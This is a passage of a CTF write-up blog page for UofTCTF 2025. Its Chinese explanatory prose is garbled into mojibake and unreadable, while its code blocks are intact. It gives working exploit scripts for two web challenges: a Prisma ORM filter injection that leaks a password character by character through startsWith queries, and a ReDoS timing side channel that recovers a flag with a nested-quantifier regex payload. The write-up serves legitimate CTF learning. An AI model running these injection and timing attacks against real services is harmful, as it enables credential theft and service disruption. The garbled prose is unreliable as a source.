<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allTeam: ICEDTEARank: 27&#x2F;897   é–‹å ´12, 13å°æ™‚å¾Œæ‰è·³é€²å»æ‰“çš„ï¼Œå› ç‚ºæˆ°éšŠå¤§éƒ¨åˆ†æˆå“¡éƒ½åœ¨æº–å‚™è€ƒè©¦æ‰€ä»¥é€™å ´å°±å¤§æ¦‚ç©ç©ï¼Œæˆ‘æ˜¯æŒ‘è¦ºå¾—å¥½ç©çš„é¡Œç›®çœ‹çœ‹w   ä½†åœ¨é€²å ´å¾Œå¸¥æ°£åœ°ä¸‰ååˆ†é˜æ‹¿ä¸‹[Web]1337 v4ul7çš„é¦–æ®º ğŸ¥³ (çœ‹åˆ°é»‘ç®±é¡Œå±…ç„¶é‚„æ²’äººè§£å‡ºå°±èˆˆå¥®çš„me be like)      WebPrismatic Blogsé€™é¡Œæ˜¯è¢«éšŠå‹ wan">
<meta property="og:type" content="article">
<meta property="og:title" content="UofTCTF 2025 Write Up">
<meta property="og:url" content="http://wha13.github.io/2025/01/13/uoftctf-2025/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allTeam: ICEDTEARank: 27&#x2F;897   é–‹å ´12, 13å°æ™‚å¾Œæ‰è·³é€²å»æ‰“çš„ï¼Œå› ç‚ºæˆ°éšŠå¤§éƒ¨åˆ†æˆå“¡éƒ½åœ¨æº–å‚™è€ƒè©¦æ‰€ä»¥é€™å ´å°±å¤§æ¦‚ç©ç©ï¼Œæˆ‘æ˜¯æŒ‘è¦ºå¾—å¥½ç©çš„é¡Œç›®çœ‹çœ‹w   ä½†åœ¨é€²å ´å¾Œå¸¥æ°£åœ°ä¸‰ååˆ†é˜æ‹¿ä¸‹[Web]1337 v4ul7çš„é¦–æ®º ğŸ¥³ (çœ‹åˆ°é»‘ç®±é¡Œå±…ç„¶é‚„æ²’äººè§£å‡ºå°±èˆˆå¥®çš„me be like)      WebPrismatic Blogsé€™é¡Œæ˜¯è¢«éšŠå‹ wan">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/B12f77GP1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryVWnXfD1x.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJpsZ4zPJg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJlxXVzPyg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkWIY4Gvyl.png">
<meta property="article:published_time" content="2025-01-13T16:51:20.000Z">
<meta property="article:modified_time" content="2025-01-14T08:04:45.770Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web Security">
<meta property="article:tag" content="Cryptography">
<meta property="article:tag" content="ICEDTEA">
<meta property="article:tag" content="PRNG">
<meta property="article:tag" content="ReDoS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/B12f77GP1e.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>UofTCTF 2025 Write Up</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/01/11/2025-1-11-wtf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/01/13/uoftctf-2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&text=UofTCTF 2025 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&is_video=false&description=UofTCTF 2025 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=UofTCTF 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/01/13/uoftctf-2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&name=UofTCTF 2025 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/01/13/uoftctf-2025/&t=UofTCTF 2025 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prismatic-Blogs"><span class="toc-number">2.1.</span> <span class="toc-text">Prismatic Blogs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CodeDB"><span class="toc-number">2.2.</span> <span class="toc-text">CodeDB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1337-v4ul7"><span class="toc-number">2.3.</span> <span class="toc-text">1337 v4ul7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enchanted-Oracle"><span class="toc-number">3.1.</span> <span class="toc-text">Enchanted Oracle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shuffler"><span class="toc-number">3.2.</span> <span class="toc-text">Shuffler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Racing-2"><span class="toc-number">4.1.</span> <span class="toc-text">Racing 2</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        UofTCTF 2025 Write Up
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-13T16:51:20.000Z" class="dt-published" itemprop="datePublished">2025-01-13</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/ICEDTEA/" rel="tag">ICEDTEA</a>, <a class="p-category" href="/tags/PRNG/" rel="tag">PRNG</a>, <a class="p-category" href="/tags/ReDoS/" rel="tag">ReDoS</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Team: ICEDTEA<br>Rank: 27&#x2F;897  </p>
<p>é–‹å ´12, 13å°æ™‚å¾Œæ‰è·³é€²å»æ‰“çš„ï¼Œå› ç‚ºæˆ°éšŠå¤§éƒ¨åˆ†æˆå“¡éƒ½åœ¨æº–å‚™è€ƒè©¦æ‰€ä»¥é€™å ´å°±å¤§æ¦‚ç©ç©ï¼Œæˆ‘æ˜¯æŒ‘è¦ºå¾—å¥½ç©çš„é¡Œç›®çœ‹çœ‹w  </p>
<p>ä½†åœ¨é€²å ´å¾Œå¸¥æ°£åœ°ä¸‰ååˆ†é˜æ‹¿ä¸‹[Web]1337 v4ul7çš„é¦–æ®º ğŸ¥³ (<del>çœ‹åˆ°é»‘ç®±é¡Œå±…ç„¶é‚„æ²’äººè§£å‡ºå°±èˆˆå¥®çš„me be like</del>)  </p>
<p><img src="https://hackmd.io/_uploads/B12f77GP1e.png" alt="image">  </p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Prismatic-Blogs"><a href="#Prismatic-Blogs" class="headerlink" title="Prismatic Blogs"></a>Prismatic Blogs</h3><p>é€™é¡Œæ˜¯è¢«éšŠå‹ wang æ‹‰å»å¤§æ¦‚çœ‹å¾—ï¼Œä¸»ç¨‹å¼å¤§æ¦‚é•·é€™æ¨£ï¼š<br>æ˜¯ç”± Prisma DB + NodeJS Host çš„ä¸€å€‹æœå‹™<br>ç›®æ¨™æ˜¯è®€å–åˆ°æŸä¸€å€‹ <code>published</code> è¢«è¨­å®šæˆ <code>false</code> çš„ Postï¼Œä»–æ˜¯å±¬æ–¼æŸå€‹ User çš„ï¼Œè€Œç™»å…¥ User å¾Œæ˜¯èƒ½é¿é–‹ <code>published</code> é™åˆ¶çš„  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">PrismaClient</span> &#125; <span class="keyword">from</span> <span class="string">&quot;@prisma/client&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> prisma = <span class="keyword">new</span> <span class="title class_">PrismaClient</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(</span><br><span class="line">  <span class="string">&quot;/api/posts&quot;</span>,</span><br><span class="line">  <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> query = req.<span class="property">query</span>;</span><br><span class="line">      query.<span class="property">published</span> = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">let</span> posts = <span class="keyword">await</span> prisma.<span class="property">post</span>.<span class="title function_">findMany</span>(&#123;<span class="attr">where</span>: query&#125;);</span><br><span class="line">      res.<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">true</span>, posts&#125;)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, error &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(</span><br><span class="line">    <span class="string">&quot;/api/login&quot;</span>,</span><br><span class="line">    <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> &#123;name, password&#125; = req.<span class="property">body</span>;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> prisma.<span class="property">user</span>.<span class="title function_">findUnique</span>(&#123;<span class="attr">where</span>:&#123;</span><br><span class="line">                    <span class="attr">name</span>: name</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">include</span>:&#123;</span><br><span class="line">                    <span class="attr">posts</span>: <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span> (user.<span class="property">password</span> === password) &#123; </span><br><span class="line">                res.<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">posts</span>: user.<span class="property">posts</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, error&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running on http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°åœ¨ <code>/api/posts</code> è·¯å¾‘ä¸Šæ˜¯æŠŠ url åƒæ•¸å…¨éƒ¨åƒé€²å»ä½œç‚º prisma çš„ queryï¼Œä¹Ÿæ˜¯ä¸»è¦çš„å¼±é»<br>ç„¶å¾Œé€™æ˜¯ schema.prisma æª”æ¡ˆï¼š  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">datasource db &#123;</span><br><span class="line">  provider = &quot;sqlite&quot;</span><br><span class="line">  url      = &quot;file:./database.db&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">generator client &#123;</span><br><span class="line">  provider = &quot;prisma-client-js&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">model User &#123;</span><br><span class="line">  id        Int      @id @default(autoincrement())</span><br><span class="line">  createdAt DateTime @default(now())</span><br><span class="line">  name      String   @unique</span><br><span class="line">  password  String</span><br><span class="line">  posts     Post[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">model Post &#123;</span><br><span class="line">  id        Int      @id @default(autoincrement())</span><br><span class="line">  createdAt DateTime @default(now())</span><br><span class="line">  updatedAt DateTime @updatedAt</span><br><span class="line">  published Boolean  @default(false)</span><br><span class="line">  title     String   </span><br><span class="line">  body      String</span><br><span class="line">  author    User    @relation(fields: [authorId], references: [id])</span><br><span class="line">  authorId  Int</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ°åœ¨ User å’Œ Post å…©å€‹ Model è£¡éƒ½èƒ½äº’ç›¸å‘¼å«å½¼æ­¤ï¼Œçµåˆå‰›å‰›ä»»æ„æŸ¥è©¢ posts çš„åŠŸèƒ½å°±å¯ä»¥é€²è¡Œ Injection<br>åƒè€ƒå®˜æ–¹ Referenceï¼š<a target="_blank" rel="noopener" href="https://www.prisma.io/docs/orm/reference/prisma-client-reference#filter-conditions-and-operators">https://www.prisma.io/docs/orm/reference/prisma-client-reference#filter-conditions-and-operators</a>  </p>
<p>èª¿ç”¨åˆ° startsWith åˆ¤æ–·ï¼Œä¸€å€‹åƒé€™æ¨£çš„ Query å°±ç”Ÿå‡ºä¾†äº†ï¼š  </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AND<span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">	author<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		password<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			startsWith<span class="punctuation">:</span> abcdefg</span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	author<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		name<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			equals<span class="punctuation">:</span> Bob</span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœä½¿ç”¨è€…ç‚º Bob è€Œä¸”å¯†ç¢¼æ˜¯ç”± abcdefg é–‹é ­ï¼Œé‚£å°±æœƒé¡¯ç¤ºä»–æ‰€æœ‰ published çš„ postsï¼Œä¸ç„¶å°±åªæœƒå›å‚³æŸ¥è©¢æˆåŠŸï¼Œæœ‰é€™å€‹ Oracle å¾Œå°±èƒ½ä¸€å€‹ä¸€å€‹ leak å¯†ç¢¼äº†<br>æœ€å¾Œï¼Œå› ç‚º startsWith ä¸åˆ†å¤§å°å¯«ï¼Œæ‰€ä»¥ç²å¾—å¯†ç¢¼çµæœå¾Œå†ç”¨äº† lt (å°æ–¼) çš„æ¯”è¼ƒå»æŠŠå¤§å°å¯«åˆ¤æ–·å‡ºä¾†çš„<br>é™„ä¸Š wang çš„ Exploit  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">characters = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35.239.207.1:3000/api/login&quot;</span></span><br><span class="line"></span><br><span class="line">start = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> characters:</span><br><span class="line">        response = requests.get(<span class="string">f&quot;http://35.239.207.1:3000/api/posts?AND[0][author][password][startsWith]=<span class="subst">&#123;start+char&#125;</span>&amp;AND[1][author][name][equals]=Bob&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> response.json().get(<span class="string">&#x27;posts&#x27;</span>):</span><br><span class="line">            start += char</span><br><span class="line">            <span class="built_in">print</span>(start)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="CodeDB"><a href="#CodeDB" class="headerlink" title="CodeDB"></a>CodeDB</h3><p>ä¸€å€‹ Code Search çš„å°ç¶²ç«™ï¼Œæ”¯æ´ regex ä¸¦ä¸” flag.txt è·Ÿä¸€å † code æª”æ¡ˆæ˜¯ä¸€èµ·æœå°‹çš„ï¼Œåªæ˜¯ flag.txt ä¸ä¾›è®€å–  </p>
<p>è¬›åˆ° regex å°±æ˜¯ ReDoS çš„æ”»æ“Šï¼Œåˆ©ç”¨æ™‚é–“å» side channel çš„æ–¹æ³•æŠŠ flag ä¸€å€‹ä¸€å€‹å­—å…ƒæ´©æ¼å‡ºä¾†<br>Huliâ€™s Blog Post: <a target="_blank" rel="noopener" href="https://blog.huli.tw/2023/06/12/redos-regular-expression-denial-of-service/">https://blog.huli.tw/2023/06/12/redos-regular-expression-denial-of-service/</a><br>è©±ä¸å¤šèªªï¼Œä¸Š <del>è³½ä¸­ä¸æ–·ä¿®ä¿®è£œè£œçš„</del> Exploitï¼Œä¸»è¦åšçš„èª¿æ•´æ˜¯å¤šæ¸¬å¹¾æ¬¡ï¼Œç„¶å¾Œæ”¹ç”¨ hex çš„æ–¹æ³•è¡¨é”å­—å…ƒï¼ˆå› ç‚ºæœ‰äº›å­—å…ƒæœƒè¢«ç•¶ regex è¡¨é”å¼ï¼‰<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_search</span>(<span class="params">regex</span>):</span><br><span class="line">    endpoint=<span class="string">&#x27;http://34.162.172.123:3000/search&#x27;</span></span><br><span class="line">    op=time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    	req.post(endpoint, json=&#123;<span class="string">&quot;query&quot;</span>:regex,<span class="string">&quot;language&quot;</span>:<span class="string">&quot;All&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> time.time()-op</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;uoftctf&#123;&#x27;</span></span><br><span class="line">suf_payload=<span class="string">&#x27;(((((.*)*)*)*)*)!/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    found=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> cur <span class="keyword">in</span> tqdm(string.printable):</span><br><span class="line">        <span class="keyword">if</span> do_search(<span class="string">&#x27;/&#x27;</span>+flag+<span class="string">f&quot;[\\x<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">ord</span>(cur))[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>]&quot;</span>+suf_payload)&gt;<span class="number">4.5</span>:</span><br><span class="line">            flag+=cur</span><br><span class="line">            found=<span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*]Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> cur==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ryVWnXfD1x.png" alt="image">  </p>
